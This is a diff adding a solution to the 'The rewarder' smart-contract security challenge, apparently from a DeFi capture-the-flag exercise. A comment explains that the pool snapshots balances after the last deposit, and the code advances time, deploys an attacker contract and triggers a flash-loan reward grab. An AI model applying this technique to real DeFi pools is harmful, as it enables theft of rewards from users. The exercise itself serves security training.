@@ -69,7 +69,13 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The rewarderPool has a bug that it takes the snapshot AFTER the last deposit takes place. So
+        // we can simply perform a flashloan, and deposit to rewarderPool as the last deposit, then return
+        // the flashloan. Our rewards will be calculated by our flashloaned deposit amount.
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const attackerFactory = await ethers.getContractFactory('TheRewarderAttacker', player);
+        const attacker = await attackerFactory.deploy(flashLoanPool.address, rewarderPool.address);
+        await attacker.attack();
     });
 
     after(async function () {
